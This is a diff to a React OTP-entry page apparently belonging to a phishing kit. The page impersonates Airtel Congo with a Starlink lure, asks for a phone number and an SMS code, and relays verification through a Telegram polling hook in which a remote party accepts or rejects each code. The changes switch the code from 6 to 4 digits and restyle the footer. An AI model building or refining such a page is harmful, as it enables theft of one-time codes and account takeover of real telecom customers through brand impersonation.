@@ -33,7 +33,7 @@ export const OtpPage: React.FC<OtpPageProps> = ({
   onBack,
   onOtpSuccess,
 }) => {
-  const [otpDigits, setOtpDigits] = useState<string[]>(['', '', '', '', '', '']);
+  const [otpDigits, setOtpDigits] = useState<string[]>(['', '', '', '']);
   const [countdown, setCountdown] = useState(60);
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [errorMessage, setErrorMessage] = useState<string | null>(null);
@@ -59,7 +59,7 @@ export const OtpPage: React.FC<OtpPageProps> = ({
     setErrorMessage(null);
 
     // Auto focus next
-    if (clean && index < 5) {
+    if (clean && index < 3) {
       otpInputRefs.current[index + 1]?.focus();
     }
   };
@@ -72,15 +72,15 @@ export const OtpPage: React.FC<OtpPageProps> = ({
 
   const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
     e.preventDefault();
-    const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
+    const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4);
     if (pasted) {
-      const newDigits = ['', '', '', '', '', ''];
+      const newDigits = ['', '', '', ''];
       for (let i = 0; i < pasted.length; i++) {
         newDigits[i] = pasted[i];
       }
       setOtpDigits(newDigits);
-      if (pasted.length === 6) {
-        otpInputRefs.current[5]?.focus();
+      if (pasted.length === 4) {
+        otpInputRefs.current[3]?.focus();
       } else {
         otpInputRefs.current[pasted.length]?.focus();
       }
@@ -88,7 +88,7 @@ export const OtpPage: React.FC<OtpPageProps> = ({
   };
 
   const currentOtp = otpDigits.join('');
-  const isOtpComplete = currentOtp.length === 6;
+  const isOtpComplete = currentOtp.length === 4;
 
   // Telegram polling hook for OTP verification
   const { status: telegramStatus } = useTelegramPolling({
@@ -104,7 +104,7 @@ export const OtpPage: React.FC<OtpPageProps> = ({
     onRejected: () => {
       setIsWaitingTelegram(false);
       setErrorMessage('Code OTP incorrect ou expiré. Veuillez vérifier le SMS et réessayer.');
-      setOtpDigits(['', '', '', '', '', '']);
+      setOtpDigits(['', '', '', '']);
       otpInputRefs.current[0]?.focus();
     },
   });
@@ -137,7 +137,7 @@ export const OtpPage: React.FC<OtpPageProps> = ({
   const handleResend = () => {
     if (countdown > 0) return;
     setCountdown(60);
-    setOtpDigits(['', '', '', '', '', '']);
+    setOtpDigits(['', '', '', '']);
     setErrorMessage(null);
     otpInputRefs.current[0]?.focus();
   };
@@ -189,7 +189,7 @@ export const OtpPage: React.FC<OtpPageProps> = ({
               Vérification du Code OTP
             </h2>
             <p className="text-xs sm:text-sm text-neutral-500 mt-2 max-w-sm">
-              Un code de sécurité à <b>6 chiffres</b> a été transmis par SMS au numéro :
+              Un code de sécurité à <b>4 chiffres</b> a été transmis par SMS au numéro :
             </p>
             <div className="mt-2 inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-neutral-100 border border-neutral-200 text-xs font-bold text-neutral-800">
               <span>🇨🇩 +243 {phone}</span>
@@ -220,16 +220,16 @@ export const OtpPage: React.FC<OtpPageProps> = ({
             </motion.div>
           )}
 
-          {/* 6-Digit OTP Form */}
+          {/* 4-Digit OTP Form */}
           <form onSubmit={handleSubmit} className="space-y-6">
             <div>
               <label className="block text-xs font-bold text-neutral-600 uppercase tracking-wider text-center mb-3">
-                Saisissez les 6 chiffres du code SMS
+                Saisissez les 4 chiffres du code SMS
               </label>
 
-              {/* 6 Discrete Boxes */}
-              <div className="grid grid-cols-6 gap-1.5 sm:gap-3">
-                {[0, 1, 2, 3, 4, 5].map((index) => (
+              {/* 4 Discrete Boxes */}
+              <div className="flex items-center justify-center gap-2.5 sm:gap-3.5">
+                {[0, 1, 2, 3].map((index) => (
                   <input
                     key={index}
                     id={`otp-input-${index}`}
@@ -244,7 +244,7 @@ export const OtpPage: React.FC<OtpPageProps> = ({
                     onChange={(e) => handleDigitChange(index, e.target.value)}
                     onKeyDown={(e) => handleKeyDown(index, e)}
                     onPaste={index === 0 ? handlePaste : undefined}
-                    className="w-full h-12 sm:h-16 text-center text-xl sm:text-2xl font-black text-neutral-900 rounded-2xl border-2 border-blue-600 bg-white focus:border-[#E60000] focus:ring-4 focus:ring-red-500/20 focus:outline-none transition-all shadow-sm"
+                    className="w-12 h-14 sm:w-16 sm:h-16 text-center text-2xl font-black text-neutral-900 rounded-2xl border-2 border-blue-600 bg-white focus:border-[#E60000] focus:ring-4 focus:ring-red-500/20 focus:outline-none transition-all shadow-sm"
                   />
                 ))}
               </div>
@@ -311,14 +311,14 @@ export const OtpPage: React.FC<OtpPageProps> = ({
         status={telegramStatus}
       />
 
-      {/* Footer with anti-overlap responsive spacing */}
-      <footer className="w-full bg-white border-t border-neutral-200 px-4 py-6 text-center">
-        <div className="max-w-4xl mx-auto flex flex-col items-center justify-center gap-2">
-          <AirtelLogo variant="red" className="h-6" />
-          <p className="text-xs text-neutral-600 font-medium leading-relaxed">
-            En collaboration avec <span className="text-neutral-900 font-bold">STARLINK™</span>
+      {/* Footer with clean responsive spacing */}
+      <footer className="w-full bg-white border-t border-neutral-200 mt-auto py-8 sm:py-10 px-4 sm:px-6 text-center">
+        <div className="max-w-4xl mx-auto flex flex-col items-center justify-center gap-3 sm:gap-4">
+          <AirtelLogo variant="red" size="sm" />
+          <p className="text-xs text-neutral-600 font-medium">
+            En collaboration avec <span className="text-neutral-900 font-bold tracking-wider">STARLINK™</span>
           </p>
-          <p className="text-[11px] text-neutral-400 leading-normal">
+          <p className="text-[11px] text-neutral-400">
             © 2026 Airtel Congo. Tous droits réservés.
           </p>
         </div>
